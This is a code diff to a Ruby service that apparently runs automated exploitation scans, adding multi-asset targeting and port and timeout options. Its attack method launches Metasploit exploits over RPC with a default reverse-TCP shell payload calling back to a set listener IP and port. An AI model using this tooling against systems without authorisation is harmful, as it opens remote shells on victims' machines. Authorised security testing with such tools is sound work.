@@ -6,12 +6,13 @@ require 'net/smtp'
 require 'thread'
 
 class ScanService
-  def initialize(org_id, exploit_range, user_id, scan = nil, asset_id = nil)
+  def initialize(org_id, exploit_range, user_id, scan = nil, asset_ids = [], scan_options = {})
     @org_id = org_id
     @exploit_range = exploit_range
     @user_id = user_id
     @scan = scan
-    @asset_id = asset_id
+    @asset_ids = Array(asset_ids).map(&:to_i).select { |id| id > 0 }
+    @scan_options = scan_options || {}
   end
 
   def perform
@@ -136,10 +137,12 @@ class ScanService
   end
 
   def attack(exploit, target_ip, port, proxy = nil)
-    puts "Attacking #{target_ip}:#{port} with exploit: #{exploit['name']}#{proxy ? " via #{proxy}" : " (direct)"}..."
+    effective_port = @scan_options[:port_override].presence || port
+    timeout_secs   = @scan_options[:timeout].presence || 120
+    puts "Attacking #{target_ip}:#{effective_port} with exploit: #{exploit['name']}#{proxy ? " via #{proxy}" : " (direct)"}..."
 
     begin
-      Timeout.timeout(120) do
+      Timeout.timeout(timeout_secs.to_i) do
         rpc = Msf::RPC::Client.new(
           host: ENV.fetch('MSF_HOST', '127.0.0.1'),
           port: ENV.fetch('MSF_PORT', '55553').to_i,
@@ -150,7 +153,7 @@ class ScanService
 
         options = {
           'RHOSTS'  => target_ip,
-          'RPORT'   => port.to_s,
+          'RPORT'   => effective_port.to_s,
           'PAYLOAD' => exploit['default_payload'].presence || 'linux/x86/shell/reverse_tcp',
           'LHOST'   => ENV.fetch('MSF_LHOST', '100.69.88.107'),
           'LPORT'   => ENV.fetch('MSF_LPORT', '4444')
@@ -291,7 +294,7 @@ class ScanService
   end
 
   def get_targets(org_id)
-    condition = @asset_id ? "AND id = #{@asset_id.to_i}" : ""
+    condition = @asset_ids.any? ? "AND id IN (#{@asset_ids.map(&:to_i).join(',')})" : ""
     result = ActiveRecord::Base.connection.select_all(
       "SELECT id, ip_address, scan_config FROM assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
     )
